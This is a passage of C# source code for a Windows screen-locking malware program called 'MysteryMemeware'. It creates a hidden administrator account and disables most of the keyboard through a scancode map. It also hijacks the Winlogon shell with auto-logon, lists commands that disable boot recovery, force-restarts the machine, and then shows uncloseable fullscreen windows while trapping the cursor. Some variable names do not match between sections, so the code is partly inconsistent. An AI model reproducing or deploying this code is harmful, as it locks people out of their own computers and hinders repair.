                char[] userPasswordChars = new char[14] { 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '1', '2', '3', '4', '5', '6' };

                for (int i = 0; i < 14; i++)
                {
                    userPasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
                }

                userPassword = new string(userPasswordChars);
            }
            catch
            {
                try
                {
                    userPassword = "Password123456";
                }
                catch
                {

                }
            }

            #endregion

            #region Change User Password

            //Attempt to enable the current user.

            if (currentUsername is not null)
            {
                try
                {
                    //First try to run the command normally.

                    System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();

                    enableUserStartInfo.Arguments = "user \"" + currentUsername + "\" /active:yes";
                    enableUserStartInfo.CreateNoWindow = true;
                    enableUserStartInfo.Domain = null;
                    enableUserStartInfo.ErrorDialog = false;
                    enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                    //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.

                    if (system32Path is not null)
                    {
                        enableUserStartInfo.FileName = system32Path + "net.exe";
                    }
                    else
                    {
                        enableUserStartInfo.FileName = "net.exe";
                    }

                    enableUserStartInfo.LoadUserProfile = false;
                    enableUserStartInfo.Password = null;
                    enableUserStartInfo.PasswordInClearText = null;
                    enableUserStartInfo.RedirectStandardError = false;
                    enableUserStartInfo.RedirectStandardInput = false;
                    enableUserStartInfo.RedirectStandardOutput = false;
                    enableUserStartInfo.StandardErrorEncoding = null;
                    enableUserStartInfo.StandardOutputEncoding = null;
                    enableUserStartInfo.UserName = null;
                    enableUserStartInfo.UseShellExecute = false;
                    enableUserStartInfo.Verb = "runas";
                    enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                    //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.

                    if (system32Path is not null)
                    {
                        enableUserStartInfo.WorkingDirectory = system32Path;
                    }
                    else
                    {
                        enableUserStartInfo.WorkingDirectory = null;
                    }

                    System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);

                    while (!enableUserProcess.HasExited)
                    {

                    }

                    if (enableUserProcess.ExitCode is not 0)
                    {
                        throw new System.Exception("Enable user process failed with exit code " + enableUserProcess.ExitCode.ToString());
                    }
                }
                catch
                {
                    try
                    {
                        //Second try to run the command without administrator. This will only work if the user has abnormal UAC settings.

                        System.Diagnostics.ProcessStartInfo enableUserStartInfo = new System.Diagnostics.ProcessStartInfo();

                        enableUserStartInfo.Arguments = "user \"" + currentUsername + "\" /active:yes";
                        enableUserStartInfo.CreateNoWindow = true;
                        enableUserStartInfo.Domain = null;
                        enableUserStartInfo.ErrorDialog = false;
                        enableUserStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                        //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.

                        if (system32Path is not null)
                        {
                            enableUserStartInfo.FileName = system32Path + "net.exe";
                        }
                        else
                        {
                            enableUserStartInfo.FileName = "net.exe";
                        }

                        enableUserStartInfo.LoadUserProfile = false;
                        enableUserStartInfo.Password = null;
                        enableUserStartInfo.PasswordInClearText = null;
                        enableUserStartInfo.RedirectStandardError = false;
                        enableUserStartInfo.RedirectStandardInput = false;
                        enableUserStartInfo.RedirectStandardOutput = false;
                        enableUserStartInfo.StandardErrorEncoding = null;
                        enableUserStartInfo.StandardOutputEncoding = null;
                        enableUserStartInfo.UserName = null;
                        enableUserStartInfo.UseShellExecute = false;
                        enableUserStartInfo.Verb = null;
                        enableUserStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                        //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.

                        if (system32Path is not null)
                        {
                            enableUserStartInfo.WorkingDirectory = system32Path;
                        }
                        else
                        {
                            enableUserStartInfo.WorkingDirectory = null;
                        }

                        System.Diagnostics.Process enableUserProcess = System.Diagnostics.Process.Start(enableUserStartInfo);

                        while (!enableUserProcess.HasExited)
                        {

                        }

                        if (enableUserProcess.ExitCode is not 0)
                        {
                            throw new System.Exception("Enable user process failed with exit code " + enableUserProcess.ExitCode.ToString());
                        }
                    }
                    catch
                    {

                    }
                }
            }

            #endregion

            #region Generate Admin Password

            //Attempt to generate a new 14 character password for the local administrator account.

            //The default value is null. A value of null indicates all methods for generating local administrator password failed.

            string adminPassword = null;

            try
            {
                System.Random RNG = new System.Random((int)System.DateTime.Now.Ticks);

                char[] adminPasswordChars = new char[14] { 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', '1', '2', '3', '4', '5', '6' };

                for (int i = 0; i < 14; i++)
                {
                    adminPasswordChars[i] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[RNG.Next(0, 62)];
                }

                adminPassword = new string(adminPasswordChars);
            }
            catch
            {
                try
                {
                    adminPassword = "Password123456";
                }
                catch
                {

                }
            }

            #endregion

            #region Change Admin Password

            //Attempt to enable the local administrator user.

            try
            {
                //First try to run the command normally.

                System.Diagnostics.ProcessStartInfo enableAdminStartInfo = new System.Diagnostics.ProcessStartInfo();

                enableAdminStartInfo.Arguments = "user \"Administrator\" /active:yes";
                enableAdminStartInfo.CreateNoWindow = true;
                enableAdminStartInfo.Domain = null;
                enableAdminStartInfo.ErrorDialog = false;
                enableAdminStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.

                if (system32Path is not null)
                {
                    enableAdminStartInfo.FileName = system32Path + "net.exe";
                }
                else
                {
                    enableAdminStartInfo.FileName = "net.exe";
                }

                enableAdminStartInfo.LoadUserProfile = false;
                enableAdminStartInfo.Password = null;
                enableAdminStartInfo.PasswordInClearText = null;
                enableAdminStartInfo.RedirectStandardError = false;
                enableAdminStartInfo.RedirectStandardInput = false;
                enableAdminStartInfo.RedirectStandardOutput = false;
                enableAdminStartInfo.StandardErrorEncoding = null;
                enableAdminStartInfo.StandardOutputEncoding = null;
                enableAdminStartInfo.UserName = null;
                enableAdminStartInfo.UseShellExecute = false;
                enableAdminStartInfo.Verb = "runas";
                enableAdminStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.

                if (system32Path is not null)
                {
                    enableAdminStartInfo.WorkingDirectory = system32Path;
                }
                else
                {
                    enableAdminStartInfo.WorkingDirectory = null;
                }

                System.Diagnostics.Process enableAdminProcess = System.Diagnostics.Process.Start(enableAdminStartInfo);

                while (!enableAdminProcess.HasExited)
                {

                }

                if (enableAdminProcess.ExitCode is not 0)
                {
                    throw new System.Exception("Enable admin process failed with exit code " + enableAdminProcess.ExitCode.ToString());
                }
            }
            catch
            {
                try
                {
                    //Second try to run the command without administrator. This will only work if the user has abnormal UAC settings.

                    System.Diagnostics.ProcessStartInfo enableAdminStartInfo = new System.Diagnostics.ProcessStartInfo();

                    enableAdminStartInfo.Arguments = "user \"Administrator\" /active:yes";
                    enableAdminStartInfo.CreateNoWindow = true;
                    enableAdminStartInfo.Domain = null;
                    enableAdminStartInfo.ErrorDialog = false;
                    enableAdminStartInfo.ErrorDialogParentHandle = System.IntPtr.Zero;

                    //If the system 32 path is unspecified then just let the opperating system interperet the path by itself.

                    if (system32Path is not null)
                    {
                        enableAdminStartInfo.FileName = system32Path + "net.exe";
                    }
                    else
                    {
                        enableAdminStartInfo.FileName = "net.exe";
                    }

                    enableAdminStartInfo.LoadUserProfile = false;
                    enableAdminStartInfo.Password = null;
                    enableAdminStartInfo.PasswordInClearText = null;
                    enableAdminStartInfo.RedirectStandardError = false;
                    enableAdminStartInfo.RedirectStandardInput = false;
                    enableAdminStartInfo.RedirectStandardOutput = false;
                    enableAdminStartInfo.StandardErrorEncoding = null;
                    enableAdminStartInfo.StandardOutputEncoding = null;
                    enableAdminStartInfo.UserName = null;
                    enableAdminStartInfo.UseShellExecute = false;
                    enableAdminStartInfo.Verb = null;
                    enableAdminStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

                    //If the system 32 path is unspecified then just let the opperating system interperet the working directory by itself.

                    if (system32Path is not null)
                    {
                        enableAdminStartInfo.WorkingDirectory = system32Path;
                    }
                    else
                    {
                        enableAdminStartInfo.WorkingDirectory = null;
                    }

                    System.Diagnostics.Process enableAdminProcess = System.Diagnostics.Process.Start(enableAdminStartInfo);

                    while (!enableAdminProcess.HasExited)
                    {

                    }

                    if (enableAdminProcess.ExitCode is not 0)
                    {
                        throw new System.Exception("Enable admin process failed with exit code " + enableAdminProcess.ExitCode.ToString());
                    }
                }
                catch
                {

                }
            }

            #endregion

            //Create a new user named MysteryUser with the password specified earlier using net.exe.

            System.Diagnostics.ProcessStartInfo createUserProcessStartInfo = new System.Diagnostics.ProcessStartInfo();

            createUserProcessStartInfo.Arguments = "user /add \"MysteryUser\" \"" + newAdminPassword + "\"";
            createUserProcessStartInfo.CreateNoWindow = true;
            createUserProcessStartInfo.ErrorDialog = false;
            createUserProcessStartInfo.FileName = system32Folder + "\\net.exe";
            createUserProcessStartInfo.UseShellExecute = false;
            createUserProcessStartInfo.Verb = "runas";
            createUserProcessStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            System.Diagnostics.Process createUserProcess = System.Diagnostics.Process.Start(createUserProcessStartInfo);

            while (!createUserProcess.HasExited)
            {

            }

            if (createUserProcess.ExitCode != 0)
            {
                throw new System.Exception("Failed to create MysteryUser because net.exe returned exit code \"" + createUserProcess.ExitCode + "\".");
            }

            //Add the MyseryUser to the administrators group using net.exe.

            System.Diagnostics.ProcessStartInfo elevateUserProcessStartInfo = new System.Diagnostics.ProcessStartInfo();

            elevateUserProcessStartInfo.Arguments = "localgroup Administrators /add \"MysteryUser\"";
            elevateUserProcessStartInfo.CreateNoWindow = true;
            elevateUserProcessStartInfo.ErrorDialog = false;
            elevateUserProcessStartInfo.FileName = system32Folder + "\\net.exe";
            elevateUserProcessStartInfo.UseShellExecute = false;
            elevateUserProcessStartInfo.Verb = "runas";
            elevateUserProcessStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            System.Diagnostics.Process elevateUserProcess = System.Diagnostics.Process.Start(elevateUserProcessStartInfo);

            while (!elevateUserProcess.HasExited)
            {

            }

            if (elevateUserProcess.ExitCode != 0)
            {
                throw new System.Exception("Failed to add MysteryUser to the administrators group because net.exe returned exit code \"" + elevateUserProcess.ExitCode + "\".");
            }

            //Open the local machine registry in 64 bit mode for use later.

            Microsoft.Win32.RegistryKey LocalMachine = Microsoft.Win32.RegistryKey.OpenBaseKey(Microsoft.Win32.RegistryHive.LocalMachine, Microsoft.Win32.RegistryView.Registry64);

            //Set the users scancode map to a custom scancode map which disables most of the keyboard. For a full list of disabled keys see ATTACKMETHODS.md.

            Microsoft.Win32.RegistryKey KeyboardLayout = LocalMachine.CreateSubKey("System\\CurrentControlSet\\Control\\Keyboard Layout", true);

            byte[] scancodeMapBytes = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };

            KeyboardLayout.SetValue("Scancode Map", scancodeMapBytes);

            KeyboardLayout.Flush();
            KeyboardLayout.Close();
            KeyboardLayout.Dispose();

            //Open the software registry for use later.

            Microsoft.Win32.RegistryKey Software = LocalMachine.CreateSubKey("SOFTWARE", true);

            //Set a registry to disable the privacey experience popup when signing into a new user account.

            Microsoft.Win32.RegistryKey OOBE = Software.CreateSubKey("Policies\\Microsoft\\Windows\\OOBE", true);

            OOBE.SetValue("DisablePrivacyExperience", 1);

            OOBE.Flush();
            OOBE.Close();
            OOBE.Dispose();

            //Open up the winlogon registry for user later.

            Microsoft.Win32.RegistryKey WinLogon = Software.CreateSubKey("Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

            //Set a registry to change the users shell to this program so that it runs instantly uppon sign in. 
            WinLogon.SetValue("Shell", installLocation);

            //Set some registries to automatically sign into the the MysteryUser.

            WinLogon.SetValue("DefaultUserName", "MysteryUser");
            WinLogon.SetValue("DefaultPassword", password);
            WinLogon.SetValue("AutoAdminLogon", 1);

            //Close the winlogon registry since we are now completely done using it.

            WinLogon.Flush();
            WinLogon.Close();
            WinLogon.Dispose();

            //We are now done with the bulk of the installation. The following is just a few extra things to slow down potential repair methods.
            //Because the following are not required for this program to work correctly they are all in try / catch statements to prevent a full crash if they fail.



            /*
             C:\Windows\System32\bcdedit.exe /set bootstatuspolicy ignoreallfailures
             C:\Windows\System32\bcdedit.exe /set recoveryenabled No
             C:\Windows\System32\bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
             C:\Windows\System32\bcdedit.exe /set {default} recoveryenabled No
             C:\Windows\System32\ReAgentc.exe /disable
            */

            //Now that we are done installing this software. Open up the settings registry to store some information about the installation.

            Microsoft.Win32.RegistryKey MysteryMemeware = Software.CreateSubKey("MysteryMemeware", true);

            MysteryMemeware.SetValue("AdministratorUserPassword", newAdminPassword);
            MysteryMemeware.SetValue("DefaultUserPassword", newUserPassword);
            MysteryMemeware.SetValue("IsInstalled", "true");

            MysteryMemeware.Flush();
            MysteryMemeware.Close();
            MysteryMemeware.Dispose();

            //Close the software registry since we are now completely done using it.

            Software.Flush();
            Software.Close();
            Software.Dispose();

            //Close the local machine registry since we are now completely done using it.

            LocalMachine.Flush();
            LocalMachine.Close();
            LocalMachine.Dispose();

            //Restart the users computer to finalize the installation process using shutdown.exe.

            System.Diagnostics.ProcessStartInfo shutdownProcessStartInfo = new System.Diagnostics.ProcessStartInfo();

            shutdownProcessStartInfo.Arguments = "/r /f /t 0";
            shutdownProcessStartInfo.CreateNoWindow = true;
            shutdownProcessStartInfo.ErrorDialog = false;
            shutdownProcessStartInfo.FileName = system32Folder + "\\shutdown.exe";
            shutdownProcessStartInfo.UseShellExecute = false;
            shutdownProcessStartInfo.Verb = "runas";
            shutdownProcessStartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;

            System.Diagnostics.Process shutdownProcess = System.Diagnostics.Process.Start(shutdownProcessStartInfo);

            while (!shutdownProcess.HasExited)
            {

            }

            if (shutdownProcess.ExitCode != 0)
            {
                throw new System.Exception("Failed to restart computer because shutdown.exe returned exit code \"" + shutdownProcess.ExitCode + "\".");
            }
        }



        //Pending Approval
        public static void Run()
        {
            //VolumeModule.SetVolume();
            //TaskMGRModule.KillTaskMGR();
            // MouseLockModule.LockMouse();

            int screenCount = System.Windows.Forms.Screen.AllScreens.Length;
            for (int screenIndex = 0; screenIndex < screenCount; screenIndex++)
            {

                int localScreenIndex = screenIndex;
                System.Threading.Thread thread = new System.Threading.Thread(() =>
                {
                    System.Drawing.Image coverImage = System.Drawing.Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.CoverImage.bmp"));
                    System.Windows.Forms.Form form = new MainForm(localScreenIndex, coverImage);
                    form.ShowDialog();
                });
                thread.Start();
            }

            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer(typeof(Program).Assembly.GetManifestResourceStream("MysteryMemeware.Music.wav"));
            while (true)
            {
                soundPlayer.PlaySync();
            }
        }
        //Pending Approval
        private sealed class MainForm : System.Windows.Forms.Form
        {
            public MainForm(int screenID, System.Drawing.Image coverImage)
            {
                this.BackColor = System.Drawing.Color.White;

                this.ShowInTaskbar = false;

                this.TopMost = true;
                this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;

                this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;

                System.Windows.Forms.Screen screen = System.Windows.Forms.Screen.AllScreens[screenID];

                this.Location = screen.Bounds.Location;
                this.Width = screen.Bounds.Width;
                this.Height = screen.Bounds.Height;

                CustomPictureBox pictureBox = new CustomPictureBox();

                double targetAspectRatio = coverImage.Width / (double)coverImage.Height;

                double viewPortWidth = screen.Bounds.Width;
                double viewPortHeight = screen.Bounds.Height;

                double renderWidth = viewPortHeight * targetAspectRatio;
                double renderHeight = viewPortWidth / targetAspectRatio;

                if (renderWidth > viewPortWidth)
                {
                    renderWidth = viewPortWidth;
                }
                if (renderHeight > viewPortHeight)
                {
                    renderHeight = viewPortHeight;
                }

                double renderX = (viewPortWidth - renderWidth) / 2;
                double renderY = (viewPortHeight - renderHeight) / 2;

                pictureBox.Location = new System.Drawing.Point((int)renderX, (int)renderY);
                pictureBox.Width = (int)renderWidth;
                pictureBox.Height = (int)renderHeight;

                pictureBox.Image = coverImage;
                pictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;

                this.Controls.Add(pictureBox);

                this.FormClosing += OnFormClosing;

                this.Load += OnFormLoad;

                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }

            private void OnFormLoad(object sender, System.EventArgs e)
            {
                System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
                timer.Tick += OnTimerTick;
                timer.Interval = 1000;
                timer.Start();

                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }
            private void OnTimerTick(object sender, System.EventArgs e)
            {
                System.Windows.Forms.Cursor.Clip = new System.Drawing.Rectangle(this.Location, new System.Drawing.Size(1, 1));
                this.TopMost = true;
            }
            private void OnFormClosing(object sender, System.Windows.Forms.FormClosingEventArgs e)
            {
                e.Cancel = true;
            }
            private sealed class CustomPictureBox : System.Windows.Forms.PictureBox
            {
                protected override void OnPaint(System.Windows.Forms.PaintEventArgs paintEventArgs)
                {
                    paintEventArgs.Graphics.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor;
                    base.OnPaint(paintEventArgs);
                }
            }
        }
        //Pending Approval
        public static class VolumeModule
        {
            public static void SetVolume()
            {
                System.Threading.Thread childThread = new System.Threading.Thread(() =>
                {
                    System.IntPtr processHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
                    while (true)
                    {
                        for (int i = 0; i < 50; i++)
                        {
                            SendMessage(processHandle, 793, processHandle, 655360);
                        }
                        System.Threading.Thread.Sleep(1000);
                    }
                });
                childThread.Start();
            }
            [System.Runtime.InteropServices.DllImport("user32.dll")]
            private static extern System.IntPtr SendMessage(System.IntPtr WMAppCommandProcessHandle, uint WMAppCommand, System.IntPtr AppCommandProcessHandle, uint appCommand);
        }
    }
}